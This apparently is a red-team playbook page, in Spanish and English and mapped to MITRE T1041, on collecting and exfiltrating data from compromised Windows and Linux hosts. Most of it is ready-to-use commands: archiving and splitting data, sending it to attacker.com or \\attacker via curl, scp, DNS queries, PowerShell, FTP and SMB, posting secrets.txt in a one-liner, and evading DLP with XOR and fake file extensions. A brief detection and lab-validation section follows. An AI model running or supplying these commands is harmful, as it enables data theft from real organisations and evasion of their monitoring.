---
title: Data Collection and Exfiltration
phase: post-explotacion
platform: [windows, linux]
tags: [data, exfil, collection, staging]
risk: critical
attack_tactic: TA0010
attack_technique: T1041
data_sources: [network-traffic, dlp-logs, endpoints]
last_review: 2026-05-25
---

# Data Collection and Exfiltration

### Objetivo

Identificar, recopilar y exfiltrar datos sensibles desde sistemas comprometidos.

### Staging en objetivo

```bash
# Compression
tar -czf data.tar.gz /path/to/collect
zip -r data.zip /path/to/collect

# Split large files
split -b 50M largefile.tar.gz part_
cat part_* > largefile.tar.gz
```

### Linux exfiltration

```bash
# HTTP upload
curl -F "file=@data.tar.gz" http://attacker.com/upload

# SCP
scp data.tar.gz user@attacker:/var/www/

# DNS exfil (covert)
for char in $(echo "data" | xxd -p); do dig $char.attacker.com; done

# Cloud storage (Dropbox, GDrive)
curl -X POST -F "file=@data.txt" https://dropbox.com/upload
```

### Windows exfiltration

```powershell
# HTTP upload
Invoke-WebRequest -Uri http://attacker/file -Method POST -InFile data.zip

# FTP upload
ftp -s:commands.txt attacker

# SMB copy
copy data.zip \\attacker\share\

# DNS tunneling (dnscat2)
[byte[]]$data = Get-Content -Path "data.txt" -Raw -Encoding Byte
```

### One-liners

```bash
# HTTP exfil
curl --data-urlencode "data=$(cat secrets.txt)" http://attacker.com/collector

# Password-protected archive
zip -P password data.zip secrets.txt

# Base64 encoding for text
base64 data.txt > encoded.txt
```

### DLP evasion

```bash
# Split and xor
split -b 1M data.tar.gz chunk_
for f in chunk_*; do xor.py "$f" > "$f.enc"; done

# Rename extension
mv data.zip data.pdf
```

### Detección y Mitigación

- **Visibilidad:** DLP alerts, large outbound data transfers, DNS exfil patterns, unusual SMB outbound connections.
- **Hardening:** Implement DLP solution, network segmentation for sensitive data, block outbound connections from endpoints except through proxy.

### Validación de Cobertura

- **Prueba técnica:** Simulate data exfil via DNS/HTTP in lab.
- **Criterio de éxito:** DLP or network monitoring alerts on bulk data transferring to external host.
